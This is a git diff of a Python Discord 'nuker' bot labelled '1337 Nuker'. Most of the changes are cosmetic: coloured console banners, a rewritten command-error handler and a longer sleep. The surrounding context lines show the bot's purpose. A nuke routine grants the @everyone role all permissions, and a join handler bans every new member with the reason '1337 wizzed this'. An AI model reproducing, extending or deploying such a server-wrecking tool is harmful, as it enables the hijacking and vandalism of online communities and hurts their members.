@@ -11,8 +11,6 @@ from colorama import Fore as C
 from time import sleep
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-os.system('cls')
-
 with open('config.json') as f:
     conf = json.load(f)
     BOT_TOKEN = conf.get('BOT_TOKEN')
@@ -33,7 +31,7 @@ async def status_task():
         await asyncio.sleep(60)
 
 async def nuke(guild):
-  print(f"{C.GREEN}Nuking {C.WHITE}{guild.name} ~ {C.CYAN}Using 1337 wizzer.")
+  print(f"\n{C.CYAN}Nuking {C.WHITE}{guild.name}{C.CYAN} ~ Using 1337 wizzer.\n")
   role = discord.utils.get(guild.roles, name = "@everyone")
   try:
     await role.edit(permissions = discord.Permissions.all())
@@ -63,11 +61,17 @@ async def nuke(guild):
 
 @bot.event
 async def on_ready():
-  print("Starting Status..\n")
+  print(f"{C.BLUE}Starting Status..{C.RESET}\n")
   loop = asyncio.get_event_loop()
   loop.create_task(status_task())
   await asyncio.sleep(1)
-  print(f'Logged in as {bot.user.name} | Prefix: {BOT_PREFIX} | Version: 1.0 | DM Features Coming Soon..\n')
+  print(f'''  ╔═════════════════════════════════════════════════╗
+  ║ Bot Name: {C.YELLOW}{bot.user.name} {C.WHITE}({C.YELLOW}{bot.user.id}{C.WHITE}){C.RESET}    ║
+  ║ Prefix: {C.YELLOW}{BOT_PREFIX}{C.RESET}                                       ║
+  ║ Version: {C.YELLOW}1.0{C.RESET}                                    ║
+  ║ {C.MAGENTA}DM Features Coming Soon..{C.RESET}                       ║
+  ╚═════════════════════════════════════════════════╝
+  ''')
 
 
 @bot.command()
@@ -216,11 +220,14 @@ async def on_member_join(member):
    await member.ban(reason="1337 wizzed this")
 
 @bot.event
-async def on_command_error(error):
-  print(C.RED + "[-] [ERROR] " + error + C.RESET)
+async def on_command_error(ctx, error):
+  if isinstance(error, commands.CommandNotFound):
+    await ctx.send(f"\n{C.RED}[-] [ERROR] ~ {error}{C.RESET}")
+  else:
+    await ctx.send(f"\n{C.RED}[-] [ERROR] ~ {error}{C.RESET}")
 
 def _input():
-        sleep(5)
+        sleep(7)
         while True:
             inp = input(f"{C.WHITE}[{C.RED}1337 Nuker{C.WHITE}] ")
             if inp == "help":
